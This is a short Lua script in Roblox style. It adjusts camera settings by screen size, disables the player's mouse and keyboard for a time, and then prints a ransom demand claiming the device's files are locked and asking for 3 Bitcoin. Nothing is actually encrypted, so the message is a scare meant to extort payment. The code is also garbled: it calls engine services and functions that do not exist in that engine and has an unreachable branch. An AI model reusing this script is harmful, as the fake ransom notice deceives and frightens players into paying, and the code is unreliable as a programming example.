-- Get the width and height of the screen
local screenWidth, screenHeight = game:GetService("UserInputService").screenResolution.width, game:GetService("UserInputService").screenResolution.height

-- Set camera settings based on screen size
if screenWidth < 800 or screenHeight < 600 then -- small screen (e.g., phone)
	game:GetService("CameraService").TargetFollower = nil
	game:GetService("CameraService").ViewDistance = 20
	game:GetService("CameraService").Zoom = 1.5
elseif screenWidth >= 800 and screenHeight >= 600 then -- medium-size screen (e.g., tablet)
	game:GetService("CameraService").TargetFollower = nil
	game:GetService("CameraService").ViewDistance = 40
	game:GetService("CameraService").Zoom = 1
else -- large screen (e.g., desktop monitor)
	game:GetService("CameraService").TargetFollower = nil
	game:GetService("CameraService").ViewDistance = 90
	game:GetService("CameraService").Zoom = 1
end

-- Freeze player character and camera for 6 seconds
game:GetService("UserInputService"):SetMouseEnabled(false)
game:GetService("UserInputService"):SetKeyboardEnabled(false)
timer.Simple(6000, function()
	game:GetService("UserInputService"):SetMouseEnabled(true)
	game:GetService("UserInputService"):SetKeyboardEnabled(true)
	game:GetService("CameraService").TargetFollower = game.Players[1].Character
end)

-- Display ransom demand message via rConsolePrint
rConsolePrint("Your Device Now Has A Ransomware. All Your Apps And Files Are Now Locked. Pay Us 3 Bitcoin.")
